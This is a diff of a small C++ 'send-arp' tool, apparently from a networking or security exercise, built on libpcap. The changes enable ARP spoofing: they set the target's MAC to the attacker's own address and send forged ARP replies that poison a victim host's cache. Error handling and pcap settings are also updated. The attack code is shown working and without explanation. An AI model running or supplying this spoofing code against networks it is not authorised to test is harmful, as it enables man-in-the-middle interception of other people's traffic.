@@ -6,7 +6,8 @@ void usage()
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-int main(int argc, char* argv[]) {
+int main(int argc, char* argv[]) 
+{
 	if (argc % 2 != 0)
 	{
 		usage();
@@ -21,29 +22,42 @@ int main(int argc, char* argv[]) {
 		printf("[Error] Couldn't get my mac and ip address\n");
 		return (-1);
 	}
+	printf("---------------------------------------------------\n");
 
-	for (int i = 0; i < argc / 2; i++)
+	for (int i = 0; i < argc / 2 - 1; i++)
 	{
 		char* dev = argv[1];
 		char errbuf[PCAP_ERRBUF_SIZE];
-		pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 		t_info Victim;
 		t_info Target;
 
 		if (handle == nullptr)
 		{
-			fprintf(stderr, "[Error] couldn't open device %s(%s)\n", dev, errbuf);
+			printf("[Error] Couldn't open device %s(%s)\n", dev, errbuf);
 			return -1;
 		}
 		
-		Victim.ip = Ip(argv[2 * i + 2]);
-		Target.ip = Ip(argv[2 * i + 3]);
-		_get_victim_mac(handle, &Victim, &Attacker);
-		//Target.mac = Attacker.mac;
+		Victim.ip = Ip(std::string(argv[2 * i + 2]));
+		Target.ip = Ip(std::string(argv[2 * i + 3]));
 
-		//_send_arp_packet(handle, 1, Victim, Attacker, Victim, Target);
-		pcap_close(handle);
+		if (_get_victim_mac(handle, &Victim, &Attacker))
+		{
+			printf("[Error] Couldn't get Victim's Mac address\n");
+			return (1);
+		}
+		Target.mac = Attacker.mac;
+
+		if(_send_arp_packet(handle, 1, Victim, Attacker, Target, Victim))
+		{
+			printf("[Error] Couldn't send ARP Packet\n");
+			return (1);
+		}
 		
+		printf("[ARP] Sending ARP Packet Completed\n");
+		printf("---------------------------------------------------\n");
+
+		pcap_close(handle);
 	}
 	
 	return (0);
